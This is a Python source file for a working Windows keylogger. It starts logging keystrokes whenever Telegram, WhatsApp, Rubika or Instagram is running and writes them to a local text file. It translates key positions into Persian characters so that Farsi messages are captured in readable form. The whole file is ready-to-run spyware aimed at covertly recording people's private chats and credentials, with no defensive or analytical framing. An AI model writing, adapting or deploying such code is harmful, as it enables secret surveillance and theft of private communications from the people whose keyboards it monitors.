import psutil
from pynput.keyboard import Key, Listener
from threading import Thread, Event
import time
import win32api
import win32gui
import win32process

log_file = "keylogger.txt"

target_programs = ['Telegram.exe', 'WhatsApp.exe', 'Rubika.exe', 'Instagram.exe']

fa_key_mapping = {
    'a': 'ش', 'b': 'ذ', 'c': 'ز', 'd': 'ی', 'e': 'ث', 'f': 'ب', 'g': 'ل',
    'h': 'ا', 'i': 'ه', 'j': 'ت', 'k': 'ن', 'l': 'م', 'm': 'ئ', 'n': 'د',
    'o': 'خ', 'p': 'ح', 'q': 'ض', 'r': 'ق', 's': 'س', 't': 'ف', 'u': 'ع',
    'v': 'ر', 'w': 'ص', 'x': 'ط', 'y': 'غ', 'z': 'ظ', ',': 'و', ';': 'ک',
    "'": 'گ', '[': 'چ', ']': 'ژ', '`': 'پ', '\\': '÷', '/': '؟', '.': 'ز'
}

special_keys = {
    Key.space: " ",
    Key.enter: " [ENTER] \n",
    Key.caps_lock: "[CAPS LOCK]",
    Key.num_lock: "[NUM LOCK]",
    Key.scroll_lock: "[SCROLL LOCK]",
    Key.backspace: "[BACKSPACE]",
    Key.alt: "[ALT]", Key.alt_l: "[ALT]", Key.alt_r: "[ALT]", Key.alt_gr: "[ALT]",
    Key.tab: "[TAB]",
    Key.shift: "[SHIFT]", Key.shift_l: "[SHIFT]", Key.shift_r: "[SHIFT]",
    Key.ctrl: "[CTRL]", Key.ctrl_l: "[CTRL]", Key.ctrl_r: "[CTRL]"
}

def is_program_running(programs):
    return any(proc.info['name'] in programs for proc in psutil.process_iter(['name']))

def get_keyboard_language():
    hwnd = win32gui.GetForegroundWindow()
    thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)
    layout_id = win32api.GetKeyboardLayout(thread_id)
    language_id = layout_id & (2**16 - 1)
    return "EN" if language_id == 1033 else "FA"

def translate_key(key_str, language):
    return fa_key_mapping.get(key_str, key_str) if language == "FA" else key_str

def write_to_file(key):
    language = get_keyboard_language()
    with open(log_file, "a", encoding="utf-8") as f:
        if key in special_keys:
            f.write(special_keys[key])
        elif hasattr(key, "vk") and key.vk in range(96, 106):  
            f.write(str(key.vk - 96))
        else:
            key_str = str(key).replace("'", "")
            f.write(translate_key(key_str, language))

def on_press(key):
    write_to_file(key)

def keylogger(stop_event):
    with Listener(on_press=on_press) as listener:
        stop_event.wait()  
        listener.stop()

def main():
    stop_event = Event()
    while True:
        if is_program_running(target_programs):
            print("Keylogger activated.")
            stop_event.clear()
            logger_thread = Thread(target=keylogger, args=(stop_event,))
            logger_thread.start()

            while is_program_running(target_programs): 
                time.sleep(1)

            stop_event.set() 
            logger_thread.join()
            print("Keylogger deactivated.")
        else:
            print('sleep')
            time.sleep(5)
            
main()            